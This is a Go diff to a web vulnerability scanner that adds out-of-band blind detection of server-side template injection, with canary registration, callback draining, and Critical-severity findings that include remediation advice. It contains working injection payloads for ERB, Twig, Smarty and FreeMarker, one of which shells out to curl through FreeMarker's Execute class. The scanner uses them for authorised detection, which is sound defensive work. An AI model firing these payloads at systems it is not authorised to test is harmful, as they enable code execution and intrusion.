@@ -7,8 +7,10 @@ import (
 	"net/http"
 	"net/url"
 	"strings"
+	"time"
 
 	"github.com/londonmax12/hyperz/internal/httpclient"
+	"github.com/londonmax12/hyperz/internal/oob"
 	"github.com/londonmax12/hyperz/internal/page"
 	"github.com/londonmax12/hyperz/internal/scope"
 )
@@ -59,6 +61,8 @@ func (c SSTI) Run(ctx context.Context, client *httpclient.Client, sc *scope.Scop
 		return nil, nil
 	}
 
+	oobSrv := OOBFrom(ctx)
+
 	var findings []Finding
 	var firstErr error
 	seen := map[string]struct{}{}
@@ -75,21 +79,155 @@ func (c SSTI) Run(ctx context.Context, client *httpclient.Client, sc *scope.Scop
 			if firstErr == nil {
 				firstErr = err
 			}
-			continue
+		} else if f != nil {
+			if _, dup := seen[f.DedupeKey]; !dup {
+				seen[f.DedupeKey] = struct{}{}
+				findings = append(findings, *f)
+			}
 		}
-		if f == nil {
-			continue
+		// OOB blind path: detection for templates where the eval result
+		// is not echoed (response cached, async pipeline, write-only
+		// channel) but the engine can still issue an HTTP fetch via an
+		// include / open-uri / Execute primitive.
+		if oobSrv != nil {
+			c.probeOOB(ctx, client, oobSrv, p.URL, sink)
 		}
-		if _, dup := seen[f.DedupeKey]; dup {
-			continue
-		}
-		seen[f.DedupeKey] = struct{}{}
-		findings = append(findings, *f)
 	}
 	if firstErr != nil && len(findings) == 0 {
 		return nil, firstErr
 	}
 	return findings, nil
+}
+
+// sstiOOBPayload describes one engine-specific blind probe: the template
+// source to send (with {{URL}} substituted at probe time) and the
+// engine label the finding will quote on a hit. Each entry targets a
+// distinct template engine, so a Run that sends every payload against
+// one sink still attributes a hit to the right engine via the
+// registration's Extra metadata.
+type sstiOOBPayload struct {
+	Engine string
+	// Tmpl carries a {{URL}} placeholder replaced with the canary URL
+	// before sending. Kept as a string template (not Go's text/template)
+	// so the payload source is grep-able verbatim.
+	Tmpl string
+}
+
+// sstiOOBPayloads is the engine-by-engine list of HTTP-issuing template
+// primitives. Each one fires only when the matching engine is rendering
+// the sink AND its security configuration permits the primitive
+// (allow_url_include on for Twig/Smarty, Execute class in scope for
+// FreeMarker, open-uri loadable for ERB). The list is small on purpose:
+// a permissive engine in this set is reliably exploitable; padding it
+// with marginal-confidence payloads would dilute the signal.
+var sstiOOBPayloads = []sstiOOBPayload{
+	// Ruby ERB. open-uri is bundled with stdlib so the require almost
+	// always succeeds when ERB itself is the engine.
+	{Engine: "erb", Tmpl: `<%= require 'open-uri'; open('{{URL}}').read %>`},
+	// PHP Twig. include() across a URL needs allow_url_include=On at
+	// the PHP level AND a non-sandboxed Twig environment - both are
+	// common in legacy apps.
+	{Engine: "twig", Tmpl: `{{ include('{{URL}}') }}`},
+	// PHP Smarty. Same allow_url_include precondition.
+	{Engine: "smarty", Tmpl: `{include file='{{URL}}'}`},
+	// Java FreeMarker. The Execute class is a built-in utility; on
+	// stacks that left it in scope, a shell-out to curl issues the
+	// fetch the listener correlates against.
+	{Engine: "freemarker", Tmpl: `<#assign x="freemarker.template.utility.Execute"?new()>${x("curl {{URL}}")}`},
+}
+
+// probeOOB sends one request per engine payload, each carrying a
+// distinct canary URL. The check does not emit a finding from this
+// call; Drain translates listener-side hits into findings after the
+// scanner's wait window elapses. Per-probe errors are surfaced via the
+// ctx reporter without sinking the whole sink (one engine's transport
+// failure shouldn't suppress the others).
+func (c SSTI) probeOOB(ctx context.Context, client *httpclient.Client, srv oob.Server, target string, sink Sink) {
+	for _, pld := range sstiOOBPayloads {
+		if ctx.Err() != nil {
+			return
+		}
+		canary := srv.Register("ssti", map[string]string{
+			"target": target,
+			"sink":   sink.Name,
+			"loc":    string(sink.Loc),
+			"method": sink.Method,
+			"engine": pld.Engine,
+		})
+		wire := strings.ReplaceAll(pld.Tmpl, "{{URL}}", canary.HTTPURL)
+		_, _, _, _, err := c.send(ctx, client, sink, wire)
+		if err != nil {
+			Report(ctx, fmt.Errorf("oob probe %s %s=%s engine=%s: %w",
+				sink.Loc, sink.Name, sink.URL, pld.Engine, err))
+		}
+	}
+}
+
+// Drain emits one finding per OOB registration that observed at least
+// one callback during the scan. Implements OOBCheck.
+func (c SSTI) Drain(ctx context.Context) []Finding {
+	srv := OOBFrom(ctx)
+	if srv == nil {
+		return nil
+	}
+	var out []Finding
+	for _, reg := range srv.Registrations(c.Name()) {
+		hits := srv.Hits(reg.Canary.Token)
+		if len(hits) == 0 {
+			continue
+		}
+		out = append(out, buildSSTIOOBFinding(reg, hits))
+	}
+	return out
+}
+
+// buildSSTIOOBFinding renders one OOB-confirmed SSTI finding. Severity
+// is Critical: the engine primitives in sstiOOBPayloads (open-uri,
+// include() over URL, FreeMarker Execute) only fire on permissive
+// configurations that also expose adjacent RCE primitives, so a hit
+// almost certainly indicates a critical exposure rather than an
+// information-disclosure-only sink.
+func buildSSTIOOBFinding(reg oob.Registration, hits []oob.Hit) Finding {
+	target := reg.Extra["target"]
+	sink := reg.Extra["sink"]
+	loc := reg.Extra["loc"]
+	method := reg.Extra["method"]
+	engine := reg.Extra["engine"]
+	hit := hits[0]
+	ua := hit.Headers.Get("User-Agent")
+	return Finding{
+		Check:    "ssti",
+		Target:   target,
+		URL:      target,
+		Severity: SeverityCritical,
+		Title: fmt.Sprintf(
+			"Server-Side Template Injection (OOB-confirmed, %s engine) in %s %s %q",
+			engine, locDescriptor(Loc(loc)), loc, sink),
+		Detail: fmt.Sprintf(
+			"Parameter %q (%s) is rendered by the %s template engine with HTTP-issuing primitives "+
+				"enabled: canary %s received %d callback(s) (first hit: method=%s, source=%s, user-agent=%q). "+
+				"The %s primitives that produced this callback typically expose adjacent RCE; "+
+				"treat as remote code execution unless the engine sandbox is independently verified.",
+			sink, loc, engine, reg.Canary.HTTPURL, len(hits),
+			hit.Method, hit.SourceAddr, ua, engine),
+		CWE:   "CWE-1336",
+		OWASP: "A03:2021 Injection",
+		Remediation: "Never concatenate user input into template source code. Render user input as template " +
+			"variables or data objects instead. Disable the engine's URL-issuing primitives (allow_url_include=Off for PHP; " +
+			"remove freemarker.template.utility.Execute from the configuration's shared variables; " +
+			"sandbox Twig/Smarty environments). Use template engines with sandboxing when user-controlled templates " +
+			"are a product requirement.",
+		Evidence: &Evidence{
+			Method:     method,
+			RequestURL: target,
+			Snippet: fmt.Sprintf(
+				"Engine: %s\nCanary URL: %s\nFirst hit: %s %s from %s at %s\nUser-Agent: %s\nTotal hits: %d\n",
+				engine, reg.Canary.HTTPURL,
+				hit.Method, hit.Path, hit.SourceAddr,
+				hit.Timestamp.Format(time.RFC3339), ua, len(hits)),
+		},
+		DedupeKey: MakeKey("ssti", ScopeParam, target, "loc:"+loc, "param:"+sink, "oob:"+engine),
+	}
 }
 
 func (c SSTI) headerSinks(pageURL string) []Sink {
